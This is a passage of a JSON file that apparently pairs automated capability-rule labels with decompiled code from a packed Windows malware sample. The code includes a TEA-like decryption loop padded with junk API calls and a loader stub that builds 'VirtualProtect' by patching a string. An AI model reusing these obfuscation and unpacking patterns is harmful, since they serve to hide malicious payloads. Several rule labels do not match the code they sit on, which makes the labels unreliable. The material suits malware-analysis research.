(var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x4173d0 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00410c6e:\n    var_20h = iVar12 << (0x1fU - *0x4173d0 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x4173d4 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x4173d4 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3660
    },
    "0040fa4d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040fa4d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x416a00 ^ &stack0xfffffffc;\n    fcn.00401284(arg_10h);\n    var_14h = fcn.00410cb1(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00410229(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040faa6:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040fae6;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040fad8:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040fae6;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040fad8;\n        goto code_r0x0040faa6;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040fae6:\n    fcn.00405319(unaff_EBX);\n    return;\n}\n",
        "token_count": 506
    },
    "0040faf5": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040faf5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x416a00 ^ &stack0xfffffffc;\n    fcn.00401284(arg_10h);\n    var_14h = fcn.00410cb1(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0041076d(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040fb4e:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040fb8e;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040fb80:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040fb8e;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040fb80;\n        goto code_r0x0040fb4e;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040fb8e:\n    fcn.00405319(unaff_EBX);\n    return;\n}\n",
        "token_count": 506
    },
    "0040ccf0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.0040ccf0(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iStack1788;\n    int32_t iStack1124;\n    uchar auStack1120 [4];\n    int32_t iStack1116;\n    uchar auStack1112 [4];\n    int32_t iStack1108;\n    int32_t iStack1104;\n    int32_t iStack1100;\n    int32_t iStack1096;\n    uchar auStack1088 [4];\n    uchar auStack1084 [8];\n    uint uStack1076;\n    uchar auStack1072 [48];\n    uchar auStack1024 [1024];\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    iStack1108 = *0x416c70;\n    iStack1788 = -0x3910c8e0;\n    iStack1116 = -0x61c88647;\n    iStack1104 = *0x416c74;\n    iStack1100 = *0x416c78;\n    iStack1096 = *0x416c7c;\n    if (*0x2f8d114 == 0xf57) {\n        (*_sym.imp.KERNEL32.dll_CallNamedPipeW)(0, 0, 0, auStack1024, 0, &iStack1124, 0);\n    }\n    iStack1124 = 0x20;\n    do {\n        uVar4 = (uVar1 >> 5) + iStack1096;\n        uVar3 = uVar1 * 0x10 + iStack1100;\n        *0x2f5fb28 = 0xe9ea0636;\n        if (*0x2f8d114 == 0x3f5) {\n            (*_sym.imp.KERNEL32.dll_FileTimeToDosDateTime)(auStack1084, auStack1120, auStack1112);\n            (*_sym.imp.KERNEL32.dll_CompareFileTime)(0, 0);\n            (*_sym.imp.KERNEL32.dll_SetSystemTimeAdjustment)(0, 0);\n            (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(auStack1120);\n            (*_sym.imp.KERNEL32.dll_SetStdHandle)(0, 0);\n        }\n        if (*0x2f8d114 == 0x6e6) {\n            uStack1076 = 0;\n            fcn.00405490(auStack1072, 0, 0x30);\n            (*_sym.imp.KERNEL32.dll_SetDefaultCommConfigW)(0, &uStack1076, 0);\n        }\n        uVar2 = uVar2 - (uVar4 ^ uVar3 ^ iStack1788 + uVar1);\n        if (*0x2f8d114 == 0x839) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n        }\n        if (*0x2f8d114 == 0x78c) {\n            (*_sym.imp.KERNEL32.dll_ReadConsoleA)(0, auStack1024, 0, auStack1088, 0);\n        }\n        uVar4 = uVar2 * 0x10 + iStack1108;\n        if (*0x2f8d114 == 0x196) {\n            (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n            (*_sym.imp.KERNEL32.dll_GetProcessPriorityBoost)(0, 0);\n        }\n        *0x2f5fb30 = 0xcbd61084;\n        *0x2f5fb34 = 0xffffffff;\n        uVar1 = uVar1 - ((uVar2 >> 5) + iStack1104 ^ iStack1788 + uVar2 ^ uVar4);\n        if (*0x2f8d114 == 0x417) {\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(0, 0);\n        }\n        iStack1788 = iStack1788 - iStack1116;\n        iStack1124 = iStack1124 + -1;\n    } while (iStack1124 != 0);\n    param_1[1] = uVar2;\n    *param_1 = uVar1;\n    return;\n}\n",
        "token_count": 967
    },
    "0040e7b0": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.0040e7b0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    \n    uVar3 = *0x2f8d114;\n    if (*0x2f8d114 == 0x2ab) {\n        (*_sym.imp.KERNEL32.dll__lwrite)(0, 0, 0);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_LoadResource;\n    pcVar1 = _sym.imp.KERNEL32.dll_SetPriorityClass;\n    for (uVar3 = uVar3 >> 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        if (*0x2f8d114 == 0xe1b) {\n            (*pcVar1)(0, 0);\n        }\n        if (*0x2f8d114 == 0x710) {\n            (*pcVar2)(0, 0);\n        }\n        fcn.0040ccf0();\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "null": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t in_stack_00000014;\n    \n    fcn.00407060();\n    if (*0x2f8d114 == 0x225) {\n        (*_sym.imp.KERNEL32.dll_IsBadReadPtr)();\n    }\n    pcVar7 = 0x418330;\n    do {\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    if (pcVar7 == 0x4d6c74) {\n        fcn.00401033(0);\n    }\n    if ((*0x2f8d114 == 0x25) && (iVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(),  iVar8 == 0x3fb9d)) {\n        fcn.00401000(0, 0);\n    }\n    *0x2f61784 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n    pcVar5 = _sym.imp.KERNEL32.dll_GetFileAttributesA;\n    pcVar2 = _sym.imp.KERNEL32.dll_SearchPathW;\n    iVar8 = 0x2bd9db;\n    do {\n        if (*0x2f8d114 == 0x769) {\n            (*pcVar5)();\n            (*pcVar2)();\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_GetLocalTime;\n        pcVar4 = _sym.imp.KERNEL32.dll_SetLastError;\n        pcVar3 = _sym.imp.KERNEL32.dll_GetPrivateProfileStructW;\n        iVar8 = iVar8 + -1;\n        *0x2f5fb2c = 0;\n    } while (iVar8 != 0);\n    *0x2f8d114 = *0x417318 + 0xa2401;\n    iVar8 = 0;\n    do {\n        if (*0x2f8d114 == 0xfc) {\n            (*_sym.imp.KERNEL32.dll_ConnectNamedPipe)();\n        }\n        (*pcVar4)();\n        if (*0x2f8d114 == 0xe7c) {\n            (*pcVar6)();\n            (*pcVar3)();\n        }\n    } while (((iVar8 < 0xf9c07e) || (in_stack_00000014 == 0x110f)) && (iVar8 = iVar8 + 1,  iVar8 < 0x551df29));\n    *0x2f5fb24 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n    pcVar3 = _sym.imp.KERNEL32.dll_FreeEnvironmentStringsW;\n    pcVar5 = _sym.imp.KERNEL32.dll_SetFileApisToOEM;\n    pcVar2 = _sym.imp.KERNEL32.dll_EnumResourceNamesW;\n    iVar8 = 0;\n    uVar9 = *0x2f8d114;\n    do {\n        if (uVar9 == 0xe7e) {\n            (*pcVar2)();\n            (*pcVar3)();\n            (*pcVar5)();\n            uVar9 = *0x2f8d114;\n        }\n        if (iVar8 == 0xe6fb57) {\n            *0x2f8d118 = *0x416c68;\n        }\n        if (uVar9 == 0x13f5) {\n            (*_sym.imp.KERNEL32.dll_OpenSemaphoreA)();\n            uVar9 = *0x2f8d114;\n        }\n        pcVar4 = _sym.imp.KERNEL32.dll_WaitForMultipleObjects;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x3230176c);\n    uVar10 = 0;\n    if (uVar9 != 0) {\n        do {\n            if (uVar9 == 0xc29) {\n                (*pcVar4)();\n            }\n            fcn.0040cca0();\n            uVar10 = uVar10 + 1;\n            uVar9 = *0x2f8d114;\n        } while (uVar10 < *0x2f8d114);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_FindAtomW;\n    iVar8 = 0xe972f0;\n    do {\n        if (uVar9 == 0x94d) {\n            (*pcVar2)();\n            uVar9 = *0x2f8d114;\n        }\n        iVar8 = iVar8 + -1;\n    } while (iVar8 != 0);\n    fcn.0040cc30();\n    fcn.0040e7b0();\n    fcn.0040cc90();\n    if (*0x2f8d114 == 0x14) {\n        (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)();\n        (*_sym.imp.KERNEL32.dll_GetACP)();\n        (*_sym.imp.KERNEL32.dll_SetCommState)();\n        (*_sym.imp.KERNEL32.dll_SetTapeParameters)();\n        (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryA)();\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)();\n        (*_sym.imp.KERNEL32.dll_CopyFileW)();\n        (*_sym.imp.KERNEL32.dll_GetProfileSectionW)();\n        (*_sym.imp.KERNEL32.dll_SetFilePointer)();\n        (*_sym.imp.KERNEL32.dll_ExitProcess)();\n    }\n    return 0;\n}\n",
        "token_count": 1244
    },
    "00401855": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401855(uint arg_8h)\n\n{\n    fcn.00401729(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 39
    },
    "00402205": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402219)\n// WARNING: Removing unreachable block (ram,0x0040221f)\n// WARNING: Removing unreachable block (ram,0x00402221)\n\nvoid fcn.00402205(void)\n\n{\n    return;\n}\n",
        "token_count": 61
    },
    "0040cc30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040cc30(void)\n\n{\n    uint uVar1;\n    uint uStack20;\n    uint uStack16;\n    char *pcStack12;\n    \n    pcStack12 = \"WertualProtect\";\n    uStack16 = 0x418330;\n    uStack20 = 0x40cc43;\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)();\n    *0x418330 = 0x56;\n    *0x418331 = 0x69;\n    uStack16 = 0x40;\n    uStack20 = 0x418330;\n    uVar1 = *0x2f61784;\n    *0x2f5fb20 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x2f61784);\n    (**0x2f5fb20)(*0x2f5fb24, *0x2f8d114, uVar1, &stack0xffffffec);\n    return;\n}\n",
        "token_count": 212
    },
    "0040cca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040cca0(void)\n\n{\n    int32_t in_EAX;\n    uchar auStack28 [28];\n    \n    if (*0x2f8d114 == 0x37) {\n        (*_sym.imp.KERNEL32.dll_BuildCommDCBAndTimeoutsW)(0, auStack28, 0);\n        (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0);\n        in_EAX = (*_sym.imp.KERNEL32.dll_FreeLibraryAndExitThread)(0, 0);\n    }\n    *(*0x2f5fb24 + in_EAX) = *(*0x2f8d118 + 0xa2401 + in_EAX);\n    return;\n}\n",
        "token_count": 152
    },
    "0040f81b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f81b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_2c8h;\n    uint var_8fh;\n    \n    fcn.0040f9e4(arg_8h, arg_ch);\n    fcn.0040f9e4(arg_10h, arg_14h);\n    fcn.0040ff87();\n    fcn.0040f863();\n    return;\n}\n",
        "token_count": 112
    },
    "0040f9b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f9b1(uint arg_8h, uint arg_ch)\n\n{\n    uint var_2c8h;\n    \n    fcn.0040f9e4(arg_8h, arg_ch);\n    fcn.0040ff20();\n    fcn.0040f863();\n    return;\n}\n",
        "token_count": 74
    },
    "0040f9e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nfloat10 __cdecl fcn.0040f9e4(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    float10 fVar1;\n    uint var_ah;\n    uint var_6h;\n    uint var_2h;\n    \n    if ((arg_ch._2_2_ & 0x7ff0) == 0x7ff0) {\n        fVar1 = CONCAT28(arg_ch._2_2_, CONCAT44(arg_ch << 0xb | arg_8h >> 0x15, arg_8h)) | 0x7fff;\n    }\n    else {\n        fVar1 = CONCAT26(arg_ch._2_2_, CONCAT24(arg_ch, arg_8h));\n    }\n    return fVar1;\n}\n",
        "token_count": 183
    },
    "00401000": {
        "rules": [
            "move file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401000(uint lpExistingFileName, uint lpNewFileName)\n\n{\n    int32_t iVar1;\n    \n    // [00] -r-x section size 73728 named .text\n    iVar1 = (*_sym.imp.KERNEL32.dll_MoveFileA)(lpExistingFileName, lpNewFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.00401261(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 144
    }
}